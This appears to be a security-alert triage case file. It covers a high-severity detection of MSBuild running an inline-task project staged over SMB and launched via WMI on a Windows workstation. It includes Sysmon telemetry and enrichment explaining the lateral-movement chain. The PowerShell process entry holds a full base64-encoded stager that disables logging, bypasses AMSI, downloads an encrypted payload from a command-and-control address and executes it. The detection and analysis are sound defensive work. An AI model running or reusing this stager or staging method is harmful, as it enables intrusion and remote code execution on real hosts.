@@ -1,0 +1,200 @@
+{
+  "case_id": "CASE-CDC6E4DD",
+  "environment": {
+    "hosts": [
+      "WKS-4471 (source)",
+      "WKS-4472 (target)"
+    ],
+    "os": "Windows 10 (build 10.0.18362)",
+    "domain": "CORP.EXAMPLE",
+    "telemetry_sources": [
+      "Sysmon Operational",
+      "Windows Security Auditing (File Share auditing)"
+    ]
+  },
+  "alert": {
+    "rule_id": "TNX-EXEC-001",
+    "rule_name": "MSBuild Executed a Project File From a Non-Development Path",
+    "severity": "high",
+    "analyst_priority": "P2",
+    "description": "MSBuild.exe executed a project file located outside any recognised source-code or build-agent path. MSBuild is a signed Microsoft binary that will compile and run arbitrary C# supplied inline in a project file, so it is used to execute code on hosts where unsigned binaries would be blocked or noticed.",
+    "detection_logic": "Sysmon EventID=1 (ProcessCreate) WHERE Image ENDSWITH '\\MSBuild.exe' AND CommandLine MATCHES '\\.(xml|csproj|proj|targets)' AND CommandLine NOT MATCHES ANY (source_root_paths, build_agent_paths, '\\\\Program Files')",
+    "data_source": "Sysmon Operational (EventID 1) on WKS-4472",
+    "fired_at": "2020-09-20T21:39:24.350Z",
+    "trigger_count": 1,
+    "host": "WKS-4472"
+  },
+  "context_tier": "curated",
+  "telemetry": [
+    {
+      "event_id": "Sysmon/11",
+      "event_type": "FileCreate",
+      "utc_time": "2020-09-20 21:39:23.968",
+      "record_id": "R000940",
+      "host": "WKS-4472",
+      "image": "System",
+      "target_filename": "C:\\Windows\\Tasks\\pshell.xml",
+      "creation_utc_time": "2020-09-20 21:39:23.968"
+    },
+    {
+      "event_id": "Sysmon/1",
+      "event_type": "ProcessCreate",
+      "utc_time": "2020-09-20 21:39:24.176",
+      "record_id": "R000950",
+      "host": "WKS-4472",
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "command_line": "cmd.exe /c C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Windows\\Tasks\\pshell.xml",
+      "current_directory": "C:\\windows\\system32\\",
+      "user": "CORP\\j.marsh",
+      "integrity_level": "High",
+      "hashes": "SHA1=8DCA9749CD48D286950E7A9FA1088C937CBCCAD4,MD5=D7AB69FAD18D4A643D84A271DFC0DBDF,SHA256=FF79D3C4A0B7EB191783C323AB8363EBD1FD10BE58D8BCC96B07067743CA81D5,IMPHASH=272245E2988E1E430500B852C4FB5E18",
+      "parent_process_id": "6944",
+      "parent_image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+      "parent_command_line": "C:\\windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
+      "original_file_name": "Cmd.Exe"
+    },
+    {
+      "event_id": "Sysmon/1",
+      "event_type": "ProcessCreate",
+      "utc_time": "2020-09-20 21:39:24.350",
+      "record_id": "R000993",
+      "host": "WKS-4472",
+      "image": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
+      "command_line": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe  C:\\Windows\\Tasks\\pshell.xml",
+      "current_directory": "C:\\windows\\system32\\",
+      "user": "CORP\\j.marsh",
+      "integrity_level": "High",
+      "hashes": "SHA1=1B0FF94983178D3017B00432D34F95F404BA34E0,MD5=6C5B12051E88BE8CF20FB82834ECCDD3,SHA256=FC060CED6B0C7D0AADA14CCDE223D3EB7DD31C9861B3FD34816C948483702B38,IMPHASH=00000000000000000000000000000000",
+      "parent_process_id": "6952",
+      "parent_image": "C:\\Windows\\System32\\cmd.exe",
+      "parent_command_line": "cmd.exe /c C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Windows\\Tasks\\pshell.xml",
+      "original_file_name": "MSBuild.exe"
+    },
+    {
+      "event_id": "Security/5145",
+      "event_type": "NetworkShareFileAccess",
+      "utc_time": "2020-09-20 21:39:25.086",
+      "record_id": "R001271",
+      "host": "WKS-4472",
+      "subject_user_name": "j.marsh",
+      "subject_domain_name": "CORP",
+      "share_name": "\\\\*\\C$",
+      "relative_target_name": "Windows\\Tasks\\pshell.xml",
+      "access_mask": "0x80",
+      "access_list": "%%4423\r\n\t\t\t\t",
+      "source_ip": "10.24.8.21"
+    },
+    {
+      "event_id": "Security/5145",
+      "event_type": "NetworkShareFileAccess",
+      "utc_time": "2020-09-20 21:39:25.088",
+      "record_id": "R001273",
+      "host": "WKS-4472",
+      "subject_user_name": "j.marsh",
+      "subject_domain_name": "CORP",
+      "share_name": "\\\\*\\C$",
+      "relative_target_name": "Windows\\Tasks\\pshell.xml",
+      "access_mask": "0x120196",
+      "access_list": "%%1538\r\n\t\t\t\t%%1541\r\n\t\t\t\t%%4417\r\n\t\t\t\t%%4418\r\n\t\t\t\t%%4420\r\n\t\t\t\t%%4423\r\n\t\t\t\t%%4424\r\n\t\t\t\t",
+      "source_ip": "10.24.8.21"
+    },
+    {
+      "event_id": "Security/5145",
+      "event_type": "NetworkShareFileAccess",
+      "utc_time": "2020-09-20 21:39:25.089",
+      "record_id": "R001274",
+      "host": "WKS-4472",
+      "subject_user_name": "j.marsh",
+      "subject_domain_name": "CORP",
+      "share_name": "\\\\*\\C$",
+      "relative_target_name": "Windows\\Tasks\\pshell.xml",
+      "access_mask": "0x2",
+      "access_list": "%%4417\r\n\t\t\t\t",
+      "source_ip": "10.24.8.21"
+    },
+    {
+      "event_id": "Sysmon/11",
+      "event_type": "FileCreate",
+      "utc_time": "2020-09-20 21:39:26.456",
+      "record_id": "R001388",
+      "host": "WKS-4472",
+      "image": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
+      "target_filename": "C:\\Users\\j.marsh\\AppData\\Local\\Temp\\tfmbbev2\\tfmbbev2.dll",
+      "creation_utc_time": "2020-09-20 21:39:26.456"
+    },
+    {
+      "event_id": "Sysmon/1",
+      "event_type": "ProcessCreate",
+      "utc_time": "2020-09-20 21:39:26.517",
+      "record_id": "R001398",
+      "host": "WKS-4472",
+      "image": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
+      "command_line": "\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\" /noconfig /fullpaths @\"C:\\Users\\j.marsh\\AppData\\Local\\Temp\\tfmbbev2\\tfmbbev2.cmdline\"",
+      "current_directory": "C:\\Windows\\Tasks\\",
+      "user": "CORP\\j.marsh",
+      "integrity_level": "High",
+      "hashes": "SHA1=22A72E39D307BC628093B043EF058DB1310BBF4B,MD5=28D96A80131C05E552066C798C0D8ACB,SHA256=C5270C0D8718C66382240DB538F9BACDED8DB55424768C2D942A6210B96B2720,IMPHASH=EE1E569AD02AA1F7AECA80AC0601D80D",
+      "parent_process_id": "5460",
+      "parent_image": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
+      "parent_command_line": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe  C:\\Windows\\Tasks\\pshell.xml",
+      "original_file_name": "csc.exe"
+    },
+    {
+      "event_id": "Sysmon/11",
+      "event_type": "FileCreate",
+      "utc_time": "2020-09-20 21:39:27.824",
+      "record_id": "R001554",
+      "host": "WKS-4472",
+      "image": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
+      "target_filename": "C:\\Users\\j.marsh\\AppData\\Local\\Temp\\qu22daba\\qu22daba.dll",
+      "creation_utc_time": "2020-09-20 21:39:27.824"
+    },
+    {
+      "event_id": "Sysmon/1",
+      "event_type": "ProcessCreate",
+      "utc_time": "2020-09-20 21:39:27.830",
+      "record_id": "R001582",
+      "host": "WKS-4472",
+      "image": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
+      "command_line": "\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\" /noconfig /fullpaths @\"C:\\Users\\j.marsh\\AppData\\Local\\Temp\\qu22daba\\qu22daba.cmdline\"",
+      "current_directory": "C:\\Windows\\Tasks\\",
+      "user": "CORP\\j.marsh",
+      "integrity_level": "High",
+      "hashes": "SHA1=22A72E39D307BC628093B043EF058DB1310BBF4B,MD5=28D96A80131C05E552066C798C0D8ACB,SHA256=C5270C0D8718C66382240DB538F9BACDED8DB55424768C2D942A6210B96B2720,IMPHASH=EE1E569AD02AA1F7AECA80AC0601D80D",
+      "parent_process_id": "5460",
+      "parent_image": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
+      "parent_command_line": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe  C:\\Windows\\Tasks\\pshell.xml",
+      "original_file_name": "csc.exe"
+    },
+    {
+      "event_id": "Sysmon/1",
+      "event_type": "ProcessCreate",
+      "utc_time": "2020-09-20 21:39:28.690",
+      "record_id": "R001752",
+      "host": "WKS-4472",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "\"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAEEAQgBsAEUALgBQAFMAVgBFAFIAcwBJAE8ATgAuAE0AYQBqAE8AcgAgAC0ARwBFACAAMwApAHsAJAA0ADMAZABlADIAPQBbAFIARQBGAF0ALgBBAHMAcwBlAG0AQgBMAHkALgBHAGUAdABUAFkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBlAFQARgBpAEUAYABMAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANAAzAGQAZQAyACkAewAkADcAMQAyAGQAYgA9ACQANAAzAGQAZQAyAC4ARwBlAFQAVgBBAEwAVQBFACgAJABuAFUATABMACkAOwBJAEYAKAAkADcAMQAyAGQAQgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADcAMQAyAEQAQgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADEAMgBEAGIAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAEwATABFAGMAdABJAG8ATgBzAC4ARwBFAE4ARQByAGkAQwAuAEQAaQBDAHQAaQBvAE4AQQByAFkAWwBzAFQAUgBJAG4AZwAsAFMAWQBzAFQARQBNAC4ATwBCAEoARQBDAFQAXQBdADoAOgBuAGUAdwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANwAxADIAZABCAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAFIAaQBQAHQAQgBMAG8AYwBLAF0ALgAiAEcARQB0AEYAaQBlAGAATABEACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAGEAbAB1AEUAKAAkAE4AdQBsAGwALAAoAE4ARQB3AC0ATwBiAGoARQBjAFQAIABDAG8ATABMAEUAYwB0AEkAbwBuAHMALgBHAGUATgBFAHIAaQBDAC4ASABhAHMASABTAEUAdABbAFMAdABSAGkAbgBHAF0AKQApAH0AJABSAGUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBiAEwAeQAuAEcAZQBUAFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIARQBmAC4ARwBlAFQARgBJAEUAbABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEATAB1AGUAKAAkAG4AVQBMAGwALAAkAHQAcgBVAGUAKQA7AH0AOwBbAFMAWQBTAFQAZQBNAC4ATgBlAFQALgBTAGUAUgB2AEkAYwBlAFAATwBJAE4AdABNAGEAbgBBAGcAZQByAF0AOgA6AEUAeABwAEUAQwB0ADEAMAAwAEMATwBuAFQASQBOAFUARQA9ADAAOwAkADgAZgA1AGIAOQA9AE4AZQB3AC0ATwBCAGoARQBjAHQAIABTAFkAcwBUAGUATQAuAE4AZQBUAC4AVwBlAEIAQwBMAGkAZQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AFQALgBFAE4AYwBvAGQASQBOAGcAXQA6ADoAVQBuAGkAYwBPAGQAZQAuAEcARQB0AFMAdABSAEkATgBnACgAWwBDAE8ATgB2AGUAUgBUAF0AOgA6AEYAcgBvAE0AQgBhAHMARQA2ADQAUwB0AHIASQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkADgARgA1AEIAOQAuAEgAZQBBAEQAZQBSAFMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADgAZgA1AEIAOQAuAFAAcgBvAFgAeQA9AFsAUwBZAHMAdABlAE0ALgBOAEUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARABlAEYAQQB1AGwAdABXAEUAYgBQAHIATwBYAHkAOwAkADgAZgA1AGIAOQAuAFAAUgBPAFgAeQAuAEMAUgBlAEQAZQBuAFQASQBBAGwAcwAgAD0AIABbAFMAWQBzAFQARQBtAC4ATgBFAFQALgBDAHIAZQBkAEUAbgB0AEkAQQBMAEMAQQBDAGgAZQBdADoAOgBEAEUARgBhAFUATAB0AE4AZQBUAFcATwByAGsAQwBSAGUAZABlAE4AVABJAGEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADgAZgA1AGIAOQAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAHMAdABFAE0ALgBUAGUAeABUAC4ARQBuAGMAbwBEAEkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAWQB0AGUAUwAoACcAMABdAHIAWAAzAFkANAA6ACgAKQBKAGMAaABBAEsAawBSADcAVgBnACsAWwAvAFUAcAA5ADIAdABtAEcAUQB2ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAOABGADUAQgA5AC4ASABlAGEARABlAFIAUwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AGcAMQB2AEkAZwBRAEoAcQBUAHoAUAByADcASABjAEEATgBBAHMALwBwAE8AQgBCAEkAZABrAD0AIgApADsAJABEAGEAdABBAD0AJAA4AGYANQBiADkALgBEAE8AVwBuAEwATwBhAEQARABBAFQAYQAoACQAcwBlAHIAKwAkAHQAKQA7ACQASQBWAD0AJABkAEEAVABBAFsAMAAuAC4AMwBdADsAJABkAGEAVABhAD0AJABkAEEAVABhAFsANAAuAC4AJABEAEEAVABBAC4AbABFAE4ARwB0AEgAXQA7AC0AagBPAEkAbgBbAEMAaABhAFIAWwBdAF0AKAAmACAAJABSACAAJABkAEEAVABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=",
+      "current_directory": "C:\\Windows\\Tasks\\",
+      "user": "CORP\\j.marsh",
+      "integrity_level": "High",
+      "hashes": "SHA1=36C5D12033B2EAF251BAE61C00690FFB17FDDC87,MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481",
+      "parent_process_id": "5460",
+      "parent_image": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
+      "parent_command_line": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe  C:\\Windows\\Tasks\\pshell.xml",
+      "original_file_name": "PowerShell.EXE"
+    }
+  ],
+  "enrichment": {
+    "msbuild_abuse": "MSBuild.exe supports inline tasks: a project file may embed C# source in a <Task><Code> element, which MSBuild compiles at run time via csc.exe and executes in its own process. The result is arbitrary code execution from a signed, Microsoft-published binary already present on every .NET-capable Windows host.",
+    "path_anomaly": "The project file is C:\\Windows\\Tasks\\pshell.xml. C:\\Windows\\Tasks is a legacy scheduled-task directory, not a build path, and is writable by administrators over the C$ share. A genuine build runs against a project inside a source tree or a build-agent workspace.",
+    "delivery_path": "Security 5145 on WKS-4472 records pshell.xml written to \\\\*\\C$ under 'Windows\\Tasks' by CORP\\j.marsh, and the matching local Sysmon FileCreate is attributed to Image 'System' \u2014 the kernel SMB server. The file was staged remotely, 0.2 seconds before it was executed.",
+    "execution_vector": "The cmd.exe that launched MSBuild has WmiPrvSE.exe as its parent. A local user session does not produce that lineage; a remote WMI Win32_Process Create call does. Staging over SMB and triggering over WMI is a two-protocol lateral-movement pattern that leaves no service or scheduled task behind.",
+    "compilation_evidence": "MSBuild.exe spawned csc.exe twice against generated .cmdline files in the user's Temp directory, and wrote .cs, .dll and .out artifacts into randomly-named Temp subdirectories (tfmbbev2, qu22daba). This is the inline-task compiler at work, and is the strongest single discriminator from a normal build, where sources live beside the project file.",
+    "payload": "MSBuild.exe then spawned powershell.exe with '-noP -sta -w 1 -enc <base64>'. The -enc flag plus a hidden window and non-interactive flags is the standard launcher shape for a PowerShell implant stager.",
+    "access_mask_decode": {
+      "0x120196": "Write and append access \u2014 file being created or overwritten.",
+      "0x80": "ReadAttributes.",
+      "0x2": "WriteData."
+    }
+  }
+}
